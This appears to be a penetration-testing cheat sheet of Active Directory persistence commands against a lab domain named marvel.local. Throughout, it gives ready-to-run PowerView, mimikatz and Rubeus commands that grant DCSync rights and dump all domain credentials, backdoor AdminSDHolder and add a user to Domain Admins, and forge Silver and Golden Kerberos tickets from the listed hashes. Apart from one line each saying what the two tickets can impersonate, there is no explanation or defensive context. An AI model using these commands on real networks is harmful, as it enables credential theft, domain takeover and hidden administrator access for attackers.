### DCSync Backdoor
```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectDN -eq "DC=Marvel,DC=local" -and $_.ObjectAceType -match "DS-Replication" -and $_.SecurityIdentifier -match "S-1-5-21-410602843-3916082903-3170366279-[\d]{4,10}" } | select SecurityIdentifier,ObjectDN,ActiveDirectoryRights,ObjectAceType | fl

Add-DomainObjectAcl -TargetIdentity "DC=marvel,DC=local" -PrincipalIdentity user4 -Rights DCSync

mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:marvel.local /all /csv" exit
```

### AdminSDHolder
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=marvel,DC=local" -PrincipalIdentity user5 -Rights All

Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectDN -match "CN=AdminSDHolder,CN=System,DC=MARVEL,DC=local" -and $_.SecurityIdentifier -match "S-1-5-21-410602843-3916082903-3170366279-[\d]{4,10}" } | select SecurityIdentifier,ObjectDN,ActiveDirectoryRights,ObjectAceType | fl

net group "Domain Admins" user5 /domain /add
net group "Domain Admins" user5 /domain /delete
```

### Silver Ticket (RC4, AES256)
Machine Account to impersonate any user on any service on that machine
```powershell
Rubeus.exe silver /service:cifs/machine.marvel.local /rc4:b2dfc9634eae3d4772050b979f3f3e2f /user:user3 /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /nowrap /ptt
```

### Golden Ticket (RC4, AES256)
KRBTGT Account to impersonate any user on any service on any machine
```powershell
Rubeus.exe golden /rc4:249030b29d08621192b77cb5c8580fad /user:user3 /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /nowrap /ptt
```
